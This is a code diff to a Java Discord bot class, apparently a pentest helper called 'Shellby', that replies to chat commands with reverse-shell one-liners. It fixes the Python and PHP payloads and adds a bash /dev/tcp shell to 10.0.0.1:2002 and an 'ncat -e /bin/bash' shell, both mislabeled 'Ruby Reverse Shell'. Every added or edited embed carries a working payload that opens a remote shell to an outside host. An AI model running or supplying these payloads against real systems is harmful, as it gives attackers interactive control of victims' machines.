@@ -45,7 +45,7 @@ public class ComanndShellby_reverseshells implements MessageCreateListener {
                     .setEmbed(new EmbedBuilder()
                             .setTitle("**Python Reverse Shell**")
                             .setDescription("Use this code \n" +
-                                    "```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n")
+                                    "```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'```\n")
                             .setTimestampToNow()
                             .setFooter("Shellby Helper")
                             .setColor(new Color(95, 212, 96)))
@@ -58,7 +58,7 @@ public class ComanndShellby_reverseshells implements MessageCreateListener {
                     .setEmbed(new EmbedBuilder()
                             .setTitle("**PHP Reverse Shell**")
                             .setDescription("Use this code \n " +
-                                    "```php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&DESCRIPTOR >&DESCRIPTOR 2>&DESCRIPTOR\");'\n```")
+                                    "```php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n```")
                             .setTimestampToNow()
                             .setFooter("Shellby Helper")
                             .setColor(new Color(95, 212, 96)))
@@ -79,7 +79,34 @@ public class ComanndShellby_reverseshells implements MessageCreateListener {
 
         };
 
+        if (sprava_shell.getContent().equalsIgnoreCase("-shh java")) {
+            new MessageBuilder()
+                    .setEmbed(new EmbedBuilder()
+                            .setTitle("**Ruby Reverse Shell**")
+                            .setDescription("Use this code \n" +
+                                    "```r = Runtime.getRuntime()\n" +
+                                    "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\n" +
+                                    "p.waitFor() ```")
+                            .setTimestampToNow()
+                            .setFooter("Shellby Helper")
+                            .setColor(new Color(95, 212, 96)))
+                    .send(event.getChannel()).join();
 
+        };
+
+
+        if (sprava_shell.getContent().equalsIgnoreCase("-shh Ncat")) {
+            new MessageBuilder()
+                    .setEmbed(new EmbedBuilder()
+                            .setTitle("**Ruby Reverse Shell**")
+                            .setDescription("Use this code \n" +
+                                    "```ncat IP PORT -e /bin/bash\n ```")
+                            .setTimestampToNow()
+                            .setFooter("Shellby Helper")
+                            .setColor(new Color(95, 212, 96)))
+                    .send(event.getChannel()).join();
+
+        };
 
     }
 }
